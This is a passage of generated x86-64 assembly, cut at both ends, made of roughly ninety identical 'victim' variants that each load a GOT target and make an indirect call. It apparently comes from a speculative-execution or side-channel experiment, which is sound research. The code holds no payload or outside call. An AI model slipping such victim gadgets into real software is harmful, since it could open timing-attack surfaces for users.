	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 93
.Lvictim_win0_var93:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 94
.Lvictim_win0_var94:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 95
.Lvictim_win0_var95:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 96
.Lvictim_win0_var96:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 97
.Lvictim_win0_var97:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 98
.Lvictim_win0_var98:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 99
.Lvictim_win0_var99:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 100
.Lvictim_win0_var100:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 101
.Lvictim_win0_var101:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 102
.Lvictim_win0_var102:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 103
.Lvictim_win0_var103:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 104
.Lvictim_win0_var104:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 105
.Lvictim_win0_var105:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 106
.Lvictim_win0_var106:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 107
.Lvictim_win0_var107:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 108
.Lvictim_win0_var108:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 109
.Lvictim_win0_var109:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 110
.Lvictim_win0_var110:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 111
.Lvictim_win0_var111:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 112
.Lvictim_win0_var112:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 113
.Lvictim_win0_var113:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 114
.Lvictim_win0_var114:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 115
.Lvictim_win0_var115:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 116
.Lvictim_win0_var116:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 117
.Lvictim_win0_var117:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 118
.Lvictim_win0_var118:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 119
.Lvictim_win0_var119:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 120
.Lvictim_win0_var120:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 121
.Lvictim_win0_var121:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 122
.Lvictim_win0_var122:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 123
.Lvictim_win0_var123:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 124
.Lvictim_win0_var124:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 125
.Lvictim_win0_var125:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 126
.Lvictim_win0_var126:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 127
.Lvictim_win0_var127:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 128
.Lvictim_win0_var128:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 129
.Lvictim_win0_var129:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 130
.Lvictim_win0_var130:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 131
.Lvictim_win0_var131:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 132
.Lvictim_win0_var132:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 133
.Lvictim_win0_var133:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 134
.Lvictim_win0_var134:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 135
.Lvictim_win0_var135:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 136
.Lvictim_win0_var136:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 137
.Lvictim_win0_var137:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 138
.Lvictim_win0_var138:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 139
.Lvictim_win0_var139:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 140
.Lvictim_win0_var140:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 141
.Lvictim_win0_var141:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 142
.Lvictim_win0_var142:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 143
.Lvictim_win0_var143:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 144
.Lvictim_win0_var144:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 145
.Lvictim_win0_var145:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 146
.Lvictim_win0_var146:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 147
.Lvictim_win0_var147:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 148
.Lvictim_win0_var148:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 149
.Lvictim_win0_var149:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 150
.Lvictim_win0_var150:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 151
.Lvictim_win0_var151:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 152
.Lvictim_win0_var152:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 153
.Lvictim_win0_var153:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 154
.Lvictim_win0_var154:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 155
.Lvictim_win0_var155:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 156
.Lvictim_win0_var156:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 157
.Lvictim_win0_var157:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 158
.Lvictim_win0_var158:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 159
.Lvictim_win0_var159:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 160
.Lvictim_win0_var160:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 161
.Lvictim_win0_var161:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 162
.Lvictim_win0_var162:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 163
.Lvictim_win0_var163:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 164
.Lvictim_win0_var164:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 165
.Lvictim_win0_var165:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 166
.Lvictim_win0_var166:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 167
.Lvictim_win0_var167:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 168
.Lvictim_win0_var168:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 169
.Lvictim_win0_var169:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 170
.Lvictim_win0_var170:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 171
.Lvictim_win0_var171:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 172
.Lvictim_win0_var172:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 173
.Lvictim_win0_var173:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 174
.Lvictim_win0_var174:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 175
.Lvictim_win0_var175:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 176
.Lvictim_win0_var176:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 177
.Lvictim_win0_var177:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 178
.Lvictim_win0_var178:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 179
.Lvictim_win0_var179:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 180
.Lvictim_win0_var180:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 181
.Lvictim_win0_var181:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 182
.Lvictim_win0_var182:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 183
.Lvictim_win0_var183:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 184
.Lvictim_win0_var184:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 185
.Lvictim_win0_var185:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 186
.Lvictim_win0_var186:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
